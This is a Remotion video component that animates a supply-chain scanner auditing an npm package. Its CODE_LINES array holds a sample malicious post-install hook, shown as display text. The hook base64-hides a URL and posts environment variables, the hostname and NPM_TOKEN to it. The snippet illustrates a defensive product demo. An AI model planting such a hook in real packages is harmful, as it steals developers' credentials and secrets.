import {
  AbsoluteFill,
  interpolate,
  useCurrentFrame,
  useVideoConfig,
  Easing,
  staticFile,
} from "remotion";
import { Video } from "@remotion/media";
import { colors, fonts } from "../lib/theme";

const CODE_LINES = [
  { text: 'const http = require("http");', suspicious: false },
  { text: 'const os = require("os");', suspicious: false },
  { text: "", suspicious: false },
  { text: "// post-install hook", suspicious: false },
  { text: "module.exports = async () => {", suspicious: false },
  { text: "  const d = Buffer.from(", suspicious: true },
  { text: '    "aHR0cDovLzE5Mi4xNjguMS4x",', suspicious: true },
  { text: '    "base64"', suspicious: true },
  { text: "  ).toString();", suspicious: true },
  { text: "", suspicious: false },
  { text: "  const payload = {", suspicious: true },
  { text: "    env: process.env,", suspicious: true },
  { text: "    host: os.hostname(),", suspicious: true },
  { text: "    token: process.env.NPM_TOKEN", suspicious: true },
  { text: "  };", suspicious: true },
  { text: "", suspicious: false },
  { text: "  http.request(d, {", suspicious: true },
  { text: '    method: "POST",', suspicious: true },
  { text: "    body: JSON.stringify(payload)", suspicious: true },
  { text: "  });", suspicious: true },
  { text: "};", suspicious: false },
];

const LINE_H = 30;

const STATUS_EVENTS = [
  { frame: 5, text: "Scanning source...", color: colors.investigating },
  { frame: 80, text: "Attack vector found", color: colors.suspected },
  { frame: 130, text: "Running pentest in sandbox...", color: colors.investigating },
  { frame: 190, text: "Exploit confirmed", color: colors.danger },
  { frame: 215, text: "Proof generated", color: colors.safe },
];

export const AgentFeed: React.FC = () => {
  const frame = useCurrentFrame();
  useVideoConfig();

  // ── 3D perspective rotation (inspired by article technique) ──
  // Subtle rotation from left to right over the scene
  const rotateY = interpolate(frame, [0, 240], [-6, 6], {
    extrapolateRight: "clamp",
  });
  const rotateX = interpolate(frame, [0, 240], [2, -2], {
    extrapolateRight: "clamp",
  });

  // Blur-to-sharp reveal (first 1 second)
  const blurAmount = interpolate(frame, [0, 30], [12, 0], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
    easing: Easing.out(Easing.quad),
  });

  // Slow zoom
  const zoom = interpolate(frame, [0, 240], [0.92, 1.02], {
    extrapolateRight: "clamp",
  });

  // Code panel opacity
  const panelOpacity = interpolate(frame, [0, 20], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // Scanner sweep
  const scannerY = interpolate(frame, [30, 150], [-10, CODE_LINES.length * LINE_H + 20], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
    easing: Easing.inOut(Easing.quad),
  });

  const highlightOpacity = (lineIndex: number) => {
    const lineY = lineIndex * LINE_H;
    if (scannerY < lineY) return 0;
    return interpolate(scannerY - lineY, [0, 50], [0, 1], {
      extrapolateRight: "clamp",
    });
  };

  // Risk score
  const riskScore = Math.min(
    8,
    Math.floor(
      interpolate(frame, [80, 180], [0, 8], {
        extrapolateLeft: "clamp",
        extrapolateRight: "clamp",
      }),
    ),
  );
  const riskColor =
    riskScore >= 7 ? colors.danger : riskScore >= 4 ? colors.suspected : colors.safe;
  const riskOpacity = interpolate(frame, [80, 90], [0, 1], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // Phase progress
  const activePhase = frame < 105 ? 0 : frame < 185 ? 1 : frame < 215 ? 2 : 3;
  const phases = ["Scan", "Pentest", "Proof", "Done"];

  // Status event
  const currentEvent = [...STATUS_EVENTS].reverse().find((e) => frame >= e.frame);
  const eventLocalFrame = currentEvent ? frame - currentEvent.frame : 0;
  const eventOpacity = currentEvent
    ? interpolate(eventLocalFrame, [0, 8, 35, 45], [0, 1, 1, 0.4], {
        extrapolateLeft: "clamp",
        extrapolateRight: "clamp",
      })
    : 0;

  // Threat flash
  const threatFlash = interpolate(frame, [75, 78, 82], [0, 0.12, 0], {
    extrapolateLeft: "clamp",
    extrapolateRight: "clamp",
  });

  // Background video zoom
  const bgZoom = interpolate(frame, [0, 240], [1.05, 1.15], {
    extrapolateRight: "clamp",
  });

  return (
    <AbsoluteFill style={{ backgroundColor: "#000" }}>
      {/* Background video for visual richness */}
      <AbsoluteFill style={{ transform: `scale(${bgZoom})` }}>
        <Video
          src={staticFile("bg-terminal.mp4")}
          muted
          style={{
            width: "100%",
            height: "100%",
            objectFit: "cover",
            filter: "brightness(0.12) saturate(0.3) contrast(1.1)",
          }}
        />
      </AbsoluteFill>

      {/* Perspective container — the floating 3D document */}
      <AbsoluteFill
        style={{
          perspective: 1200,
          justifyContent: "center",
          alignItems: "center",
        }}
      >
        <div
          style={{
            width: 1200,
            transform: `scale(${zoom}) rotateY(${rotateY}deg) rotateX(${rotateX}deg)`,
            filter: `blur(${blurAmount}px)`,
            opacity: panelOpacity,
            transformStyle: "preserve-3d",
          }}
        >
          {/* Code panel — floating with shadow for depth */}
          <div
            style={{
              backgroundColor: "rgba(6, 5, 4, 0.9)",
              borderRadius: 16,
              border: "1px solid rgba(255,255,255,0.06)",
              boxShadow:
                "0 30px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.03), 0 0 200px rgba(0,0,0,0.3)",
              overflow: "hidden",
            }}
          >
            {/* Header */}
            <div
              style={{
                display: "flex",
                alignItems: "center",
                justifyContent: "space-between",
                padding: "12px 24px",
                borderBottom: "1px solid rgba(255,255,255,0.05)",
                background: "rgba(255,255,255,0.02)",
              }}
            >
              <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                <span style={{ fontFamily: fonts.mono, fontSize: 13, fontWeight: 700, color: colors.accent }}>
                  npmguard
                </span>
                <span style={{ fontFamily: fonts.mono, fontSize: 13, color: "rgba(255,255,255,0.3)" }}>
                  auditing
                </span>
                <span style={{ fontFamily: fonts.mono, fontSize: 13, color: "rgba(255,255,255,0.6)" }}>
                  axios@1.8.0
                </span>
              </div>
              <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
                {phases.map((phase, i) => {
                  const done = i < activePhase;
                  const active = i === activePhase;
                  return (
                    <div key={i} style={{ display: "flex", alignItems: "center", gap: 4 }}>
                      <div
                        style={{
                          width: 18,
                          height: 3,
                          borderRadius: 2,
                          backgroundColor: done ? colors.safe : active ? colors.investigating : "rgba(255,255,255,0.08)",
                          opacity: active ? interpolate(Math.sin(frame * 0.2), [-1, 1], [0.5, 1]) : 1,
                        }}
                      />
                      <span
                        style={{
                          fontFamily: fonts.mono,
                          fontSize: 9,
                          color: done ? colors.safe : active ? colors.investigating : "rgba(255,255,255,0.15)",
                          textTransform: "uppercase",
                        }}
                      >
                        {phase}
                      </span>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Filename */}
            <div
              style={{
                fontFamily: fonts.mono,
                fontSize: 11,
                color: "rgba(255,255,255,0.2)",
                padding: "10px 24px 6px 70px",
                letterSpacing: "0.05em",
              }}
            >
              lib/post-install.js
            </div>

            {/* Code lines */}
            <div style={{ padding: "0 8px 20px", position: "relative" }}>
              {CODE_LINES.map((line, i) => {
                const susOp = line.suspicious ? highlightOpacity(i) : 0;
                const isHighlighted = line.suspicious && susOp > 0.5;
                return (
                  <div
                    key={i}
                    style={{
                      display: "flex",
                      alignItems: "center",
                      height: LINE_H,
                      paddingLeft: 12,
                      paddingRight: 24,
                      backgroundColor: isHighlighted
                        ? `rgba(248, 113, 113, ${susOp * 0.06})`
                        : "transparent",
                      borderLeft: isHighlighted
                        ? `3px solid rgba(248, 113, 113, ${susOp})`
                        : "3px solid transparent",
                    }}
                  >
                    <span
                      style={{
                        fontFamily: fonts.mono,
                        fontSize: 13,
                        color: isHighlighted ? `rgba(248, 113, 113, ${susOp * 0.6})` : "rgba(255,255,255,0.12)",
                        width: 32,
                        textAlign: "right",
                        marginRight: 20,
                        userSelect: "none",
                      }}
                    >
                      {i + 1}
                    </span>
                    <span
                      style={{
                        fontFamily: fonts.mono,
                        fontSize: 15,
                        color: isHighlighted ? colors.danger : "rgba(255,255,255,0.7)",
                        fontWeight: isHighlighted ? 600 : 400,
                      }}
                    >
                      {line.text}
                    </span>
                  </div>
                );
              })}

              {/* Scanner sweep line */}
              {frame >= 30 && frame <= 160 && (
                <div
                  style={{
                    position: "absolute",
                    left: 60,
                    right: 24,
                    top: 28 + scannerY,
                    height: 2,
                    background: `linear-gradient(90deg, ${colors.investigating}, rgba(96, 165, 250, 0.3), transparent)`,
                    opacity: interpolate(Math.sin(frame * 0.3), [-1, 1], [0.5, 0.9]),
                    boxShadow: `0 0 30px ${colors.investigating}, 0 0 60px rgba(96, 165, 250, 0.15)`,
                  }}
                />
              )}
            </div>
          </div>
        </div>
      </AbsoluteFill>

      {/* Status notification — bottom right */}
      {currentEvent && (
        <div
          style={{
            position: "absolute",
            bottom: 40,
            right: 50,
            display: "flex",
            alignItems: "center",
            gap: 10,
            padding: "10px 20px",
            borderRadius: 8,
            background: "rgba(0,0,0,0.7)",
            border: `1px solid ${currentEvent.color}22`,
            backdropFilter: "blur(20px)",
            opacity: eventOpacity,
          }}
        >
          <div
            style={{
              width: 6,
              height: 6,
              borderRadius: "50%",
              backgroundColor: currentEvent.color,
              boxShadow: `0 0 8px ${currentEvent.color}`,
            }}
          />
          <span style={{ fontFamily: fonts.mono, fontSize: 13, color: currentEvent.color }}>
            {currentEvent.text}
          </span>
        </div>
      )}

      {/* Risk score — bottom left */}
      {frame > 80 && (
        <div
          style={{
            position: "absolute",
            bottom: 40,
            left: 50,
            display: "flex",
            alignItems: "center",
            gap: 10,
            padding: "8px 18px",
            borderRadius: 8,
            background: "rgba(0,0,0,0.7)",
            border: "1px solid rgba(255,255,255,0.05)",
            backdropFilter: "blur(20px)",
            opacity: riskOpacity,
          }}
        >
          <span style={{ fontFamily: fonts.mono, fontSize: 11, color: "rgba(255,255,255,0.4)", textTransform: "uppercase", letterSpacing: "0.05em" }}>
            Risk
          </span>
          <span style={{ fontFamily: fonts.mono, fontSize: 22, fontWeight: 700, color: riskColor }}>
            {riskScore}/10
          </span>
        </div>
      )}

      {/* Threat flash */}
      <AbsoluteFill
        style={{
          backgroundColor: colors.danger,
          opacity: threatFlash,
          pointerEvents: "none",
        }}
      />

      {/* Vignette */}
      <div
        style={{
          position: "absolute",
          inset: 0,
          background: "radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,0.5) 100%)",
          pointerEvents: "none",
        }}
      />
    </AbsoluteFill>
  );
};
